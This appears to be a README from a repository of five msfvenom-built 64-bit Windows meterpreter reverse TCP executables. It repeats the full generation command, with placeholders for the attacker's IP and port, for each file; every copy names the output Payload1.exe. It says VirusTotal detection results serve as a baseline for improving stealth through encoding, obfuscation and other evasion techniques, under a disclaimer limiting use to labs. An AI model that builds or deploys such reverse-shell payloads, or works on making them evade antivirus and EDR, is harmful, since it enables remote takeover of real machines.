# Payload Generated with Msfvenom

This directory contains a payloads generated using the `msfvenom` tool, which is widely used for creating and testing malicious payloads in controlled environments. The payload included here serves as a baseline for analyzing antivirus (AV) and Endpoint Detection and Response (EDR) detection capabilities.

---

## File Details

### `Payload1.exe`
- **Description**: A reverse TCP payload designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Executable (`.exe`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o Payload1.exe
```

Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.

---

### `Payload2.exe`
- **Description**: A reverse TCP payload designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Executable (`.exe`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o Payload1.exe
```

Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.

---

### `Payload3.exe`
- **Description**: A reverse TCP payload designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Executable (`.exe`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o Payload1.exe
```

Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.

---

### `Payload4.exe`
- **Description**: A reverse TCP payload designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Executable (`.exe`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o Payload1.exe
```

Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.

---

### `Payload5.exe`
- **Description**: A reverse TCP payload designed for testing AV and EDR detection.
- **Architecture**: 64-bit Windows
- **Type**: Executable (`.exe`)

---

## Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe -o Payload1.exe
```

Replace `<Your_IP>` with the attacker's IP address and `<Your_Port>` with the desired port for the reverse connection.

---



## Detection Analysis

The payloads were uploaded to VirusTotal to evaluate detection rates across various antivirus engines. The results are used as a baseline to identify opportunities for improving stealth through encoding, obfuscation, and other evasion techniques.

---

## Legal Notice

- **For Educational and Research Purposes Only**: This payload is strictly intended for testing in isolated environments such as virtual machines or lab setups.
- **Prohibited Usage**: Unauthorized use or deployment on live systems or production environments is against the law and organizational policies.
- **Responsibility Disclaimer**: The creator assumes no liability for misuse of the provided tools or files.
